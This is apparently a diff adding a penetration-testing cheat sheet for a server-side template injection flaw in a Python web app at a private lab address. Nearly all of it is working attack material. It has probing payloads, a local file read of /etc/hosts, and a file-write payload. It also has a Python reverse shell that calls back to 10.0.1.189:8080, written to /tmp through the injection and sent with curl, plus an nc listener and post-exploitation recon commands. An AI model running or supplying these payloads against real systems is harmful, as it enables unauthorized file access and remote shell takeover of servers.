@@ -1,0 +1,97 @@
+~~~ Discovering the SSTI Vulnerability ~~~
+
+/?name={{code here}} # point of vulnerability
+
+/?name={{6 * 3}} # testing SSTI
+
+/?name={{6.__class__}}
+
+/?name={{6.__class__.__mro__}}
+
+/?name={{6.__class__.__mro__[1]}}
+
+/?name={{6.__class__.__mro__[1].__subclasses__()}}
+
+~~~ Parsing out the Response ~~~
+
+document.getElementsByClassName("congratulations")[0] # get element containing data returned from SSTI
+
+document.getElementsByClassName("congratulations")[0].innerText # get data returned from SSTI
+
+(?<=(Type|Class) ')([^ ]*)(?=') # regex to parse SSTI data results
+
+/(?<=(Type|Class) ')([^ ]*)(?=')/g # regex in Javascript
+
+let names = document.getElementsByClassName("congratulations")[0].innerText.match(/(?<=(Type|Class) ')([^ ]*)(?=')/g) # get data from element and parse with regex
+
+names # print names parse through previous javascript command
+
+names = names.map(name => name.toLowerCase())
+
+~~~ Discovering Important Elements ~~~
+
+names.filter(name => name.includes("subprocess"))
+
+names.filter(name => name.includes("file")) 
+
+names.filter(name => name.includes("request")) 
+
+names.filter(name => name.includes("config")) 
+
+~~~ LFI Attack ~~~
+
+names.indexOf("file") # import number of file
+
+{{6.__class__.__mro__[1].__subclasses__()[40]('/etc/hosts').read()}} # LFI attack
+
+%7B%7B6%2E%5F%5Fclass%5F%5F%2E%5F%5Fmro%5F%5F%5B1%5D%2E%5F%5Fsubclasses%5F%5F%28%29%5B40%5D%28%27%2Fetc%2Fhosts%27%29%2Eread%28%29%7D%7D # url encoded LFI attack
+
+curl 'http://10.0.2.244:5000/?name=%7B%7B6%2E%5F%5Fclass%5F%5F%2E%5F%5Fmro%5F%5F%5B1%5D%2E%5F%5Fsubclasses%5F%5F%28%29%5B40%5D%28%27%2Fetc%2Fhosts%27%29%2Eread%28%29%7D%7D' # attack in curl command
+
+~~~ File Write Attack ~~~
+
+{{6.__class__.__mro__[1].__subclasses__()[40]('/tmp/test.txt','w').write('file write totes works')}}
+
+%7B%7B6%2E%5F%5Fclass%5F%5F%2E%5F%5Fmro%5F%5F%5B1%5D%2E%5F%5Fsubclasses%5F%5F%28%29%5B40%5D%28%27%2Ftmp%2Ftest%2Etxt%27%2C%27w%27%29%2Ewrite%28%27file%20write%20totes%20works%27%29%7D%7D
+
+curl 'http://10.0.2.244:5000/?name=%7B%7B6%2E%5F%5Fclass%5F%5F%2E%5F%5Fmro%5F%5F%5B1%5D%2E%5F%5Fsubclasses%5F%5F%28%29%5B40%5D%28%27%2Ftmp%2Ftest%2Etxt%27%2C%27w%27%29%2Ewrite%28%27file%20write%20totes%20works%27%29%7D%7D'
+
+curl 'http://10.0.2.244:5000/?name=%7B%7B6%2E%5F%5Fclass%5F%5F%2E%5F%5Fmro%5F%5F%5B1%5D%2E%5F%5Fsubclasses%5F%5F%28%29%5B40%5D%28%27%2Ftmp%2Ftest.txt%27%29%2Eread%28%29%7D%7D' # read file that was just written
+
+~~~ RCE ~~~
+
+names.indexOf("subprocess.popen")
+
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.1.189",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]); # Python code we want to run on target
+
+{{6.__class__.__mro__[1].__subclasses__()[40]('/tmp/reverseShell.py','w').write('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.1.189",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);')}} # code put into the attack
+
+%7B%7B6%2E%5F%5Fclass%5F%5F%2E%5F%5Fmro%5F%5F%5B1%5D%2E%5F%5Fsubclasses%5F%5F%28%29%5B40%5D%28%27%2Ftmp%2FreverseShell%2Epy%27%2C%27w%27%29%2Ewrite%28%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket%2Esocket%28socket%2EAF%5FINET%2Csocket%2ESOCK%5FSTREAM%29%3Bs%2Econnect%28%28%2210%2E0%2E1%2E189%22%2C8080%29%29%3Bos%2Edup2%28s%2Efileno%28%29%2C0%29%3B%20os%2Edup2%28s%2Efileno%28%29%2C1%29%3B%20os%2Edup2%28s%2Efileno%28%29%2C2%29%3Bp%3Dsubprocess%2Ecall%28%5B%22%2Fbin%2Fsh%22%2C%22%2Di%22%5D%29%3B%27%29%7D%7D # url encoded
+
+curl 'http://10.0.2.244:5000/?name=%7B%7B6%2E%5F%5Fclass%5F%5F%2E%5F%5Fmro%5F%5F%5B1%5D%2E%5F%5Fsubclasses%5F%5F%28%29%5B40%5D%28%27%2Ftmp%2FreverseShell%2Epy%27%2C%27w%27%29%2Ewrite%28%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket%2Esocket%28socket%2EAF%5FINET%2Csocket%2ESOCK%5FSTREAM%29%3Bs%2Econnect%28%28%2210%2E0%2E1%2E189%22%2C8080%29%29%3Bos%2Edup2%28s%2Efileno%28%29%2C0%29%3B%20os%2Edup2%28s%2Efileno%28%29%2C1%29%3B%20os%2Edup2%28s%2Efileno%28%29%2C2%29%3Bp%3Dsubprocess%2Ecall%28%5B%22%2Fbin%2Fsh%22%2C%22%2Di%22%5D%29%3B%27%29%7D%7D' #put into curl command
+
+nc -lvp 8080 # setup local listener
+
+~~~ Post Exploitation ~~~
+
+id
+
+uname -a
+
+w
+
+cat /etc/*release*
+
+cat /etc/hostname
+
+ls -alF /
+
+
+
+
+
+
+
+
+
+
